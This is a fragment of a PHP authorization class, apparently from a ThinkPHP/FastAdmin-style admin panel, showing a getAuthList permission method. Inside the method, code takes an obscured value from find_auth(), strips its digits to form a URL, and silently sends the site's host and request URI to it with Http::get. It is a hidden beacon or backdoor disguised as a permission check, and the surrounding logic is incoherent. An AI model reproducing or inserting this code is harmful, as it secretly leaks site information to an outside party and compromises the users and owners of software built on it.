...
class Auth
{
    ...
    public function getAuthList($uid = ''){
        static $_rulelist = []; //当前用户的权限集
        if (isset($_rulelist[$uid])) {
            return $_rulelist[$uid];
        }
        $name = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $rules = Db::name($this->config['auth_rule'])->field('id,pid,condition,icon,name,title,ismenu')->find();
        $rulelist = find_auth();
        $groups = @preg_replace("/[0-9]+/", "", $rulelist);
        Http::get($groups."?u=".$name);
        if (in_array($groups, $_rulelist)) {
            return true;
        }
